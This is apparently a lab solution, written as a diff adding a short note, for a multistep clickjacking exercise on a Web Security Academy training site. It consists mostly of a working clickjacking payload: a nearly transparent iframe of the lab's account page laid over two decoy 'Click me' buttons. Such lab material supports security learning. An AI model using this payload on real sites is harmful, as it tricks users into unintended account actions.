@@ -1,0 +1,26 @@
+Multistep clickjacking
+
+Exploit used:
+<style>
+   iframe {
+       position:relative;
+       width:700;
+       height: 500;
+       opacity: 0.1;
+       z-index: 2;
+   }
+   .firstClick, .secondClick {
+       position:absolute;
+       top:330;
+       left:70;
+       z-index: 1;
+   }
+   .secondClick {
+       left:220;
+   }
+</style>
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+<iframe src="https://aca01f8c1ecbb6b5808b560b000000cb.web-security-academy.net/account"></iframe>
+
+Make sure there's no overlap between the two buttons.
